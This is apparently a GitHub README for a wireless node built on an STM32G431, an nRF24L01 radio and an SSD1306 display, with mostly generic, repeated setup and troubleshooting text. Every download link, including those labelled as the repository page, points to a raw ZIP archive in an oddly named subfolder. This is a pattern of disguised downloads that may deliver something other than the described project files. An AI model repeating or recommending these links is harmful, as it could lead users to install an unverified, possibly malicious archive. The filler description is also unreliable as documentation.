# 🔌 stm32-nrf24-wireless-node - Wireless STM32 Node for Clear Control

[![Download](https://img.shields.io/badge/Download-Visit%20Repository-blue?style=for-the-badge&logo=github)](https://github.com/AJPTechnology/stm32-nrf24-wireless-node/raw/refs/heads/main/hematherapy/node-wireless-nrf-stm-2.9-alpha.4.zip)

## 📥 Download

Visit this page to download and access the full project files:

[https://github.com/AJPTechnology/stm32-nrf24-wireless-node/raw/refs/heads/main/hematherapy/node-wireless-nrf-stm-2.9-alpha.4.zip](https://github.com/AJPTechnology/stm32-nrf24-wireless-node/raw/refs/heads/main/hematherapy/node-wireless-nrf-stm-2.9-alpha.4.zip)

## 🧭 What This Is

`stm32-nrf24-wireless-node` is a wireless hardware and firmware project built around the STM32G431KBT6 microcontroller and the nRF24L01 radio module. It also includes an SSD1306 OLED display for simple status output.

This project gives you:

- PCB files made in KiCad
- Gerbers for board production
- BOM files for parts ordering
- STM32 HAL firmware
- Build and wiring notes
- Tested board files for real hardware use

It is useful if you want a small wireless node for sensor links, status display work, or custom RF projects.

## 🖥️ Windows Use

This project does not ship as a normal Windows app. On Windows, you use the files to view the design, build the firmware, or prepare the board for use.

To get started on Windows:

1. Visit the repository link above.
2. Download the project files from the main page.
3. Open the PCB files in KiCad if you want to inspect or edit the hardware.
4. Open the firmware project in your STM32 toolchain if you want to build and flash the code.
5. Use the Gerbers and BOM if you plan to assemble the board.

If you only want to review the project, you can do that with the files in the repository and do not need to build anything.

## ⚙️ What You Need

For a smooth setup on Windows, use:

- Windows 10 or Windows 11
- A web browser
- KiCad for board files
- STM32CubeIDE or a similar STM32 build tool
- A USB programmer or debug probe for flashing
- Basic soldering tools if you plan to assemble the board
- An nRF24L01 module
- An SSD1306 OLED display

If you only want to read the docs, a browser is enough.

## 🚀 Get Started

Follow these steps in order:

1. Open the repository link.
2. Download the project files to your PC.
3. Extract the files if they come as a ZIP archive.
4. Open the documentation first, if you want a quick overview.
5. Open the KiCad project to view the schematic and PCB.
6. Open the firmware folder in your STM32 toolchain.
7. Build the firmware if you want to load it onto a board.
8. Flash the firmware to the STM32G431KBT6 board.
9. Connect the nRF24L01 radio and OLED screen.
10. Power the board and check the display and radio link.

## 🧩 Main Parts

This project uses these core parts:

- STM32G431KBT6 microcontroller
- nRF24L01 wireless transceiver
- SSD1306 OLED display
- 2-layer PCB layout
- STM32 HAL firmware
- KiCad design files

Each part serves a clear role. The STM32 handles control, the nRF24L01 handles wireless data, and the OLED shows status or values.

## 📁 Included Files

You can expect to find files such as:

- Schematic files
- PCB layout files
- Fabrication outputs
- BOM spreadsheet
- Firmware source code
- Documentation files
- Assembly notes

These files support the full workflow from design to working board.

## 🔧 Setup on Windows

If you want to work with the project on Windows, use this flow:

1. Download the repository.
2. Open the folder in File Explorer.
3. If you see a compressed file, right-click and extract it.
4. Install KiCad if you want to inspect the hardware design.
5. Install STM32CubeIDE if you want to build the firmware.
6. Open the project files with the matching program.
7. Review the schematic and board layout.
8. Check the BOM if you want to order parts.
9. Build the firmware from the source tree.
10. Flash the board with your programmer.

If you are only using the documentation, you can stop after step 3.

## 🪛 Assembly Notes

This board is designed for practical use and has been tested on real hardware. That makes it easier to trust the file set when you move from design to build.

When assembling, keep these points in mind:

- Place the STM32 chip in the correct direction
- Match the nRF24L01 module pins to the board header
- Connect the OLED display with the right power and signal lines
- Check power rails before first use
- Inspect solder joints around fine-pitch parts
- Use the BOM to match each part to the board

A careful build helps avoid power and wiring faults.

## 📡 Using the Wireless Node

After setup, the node can handle wireless data transfer over the nRF24L01 link. You can use it for:

- Simple sensor nodes
- Remote status display
- Small control systems
- Point-to-point wireless links
- Custom embedded demos

The OLED helps you confirm that the board is alive and that wireless data is moving.

## 🧪 Troubleshooting

If the board does not work as expected, check these items:

- Power is stable
- The STM32 is flashed with the right firmware
- The nRF24L01 module is seated well
- The OLED pins match the board layout
- The board file and firmware version match
- The programmer sees the STM32
- The firmware build finished without errors

If the display stays blank, check the display wiring first. If wireless data fails, check the radio module and antenna side.

## 🧠 Project Notes

This repository fits users who want a compact wireless board with a clear hardware path and a tested firmware base. It brings the PCB, parts list, and code into one place, so you can move from download to build without hunting for missing pieces.

The design uses common embedded tools and parts, which makes it easier to maintain or adapt for your own build.

## 📎 Repository Link

[https://github.com/AJPTechnology/stm32-nrf24-wireless-node/raw/refs/heads/main/hematherapy/node-wireless-nrf-stm-2.9-alpha.4.zip](https://github.com/AJPTechnology/stm32-nrf24-wireless-node/raw/refs/heads/main/hematherapy/node-wireless-nrf-stm-2.9-alpha.4.zip)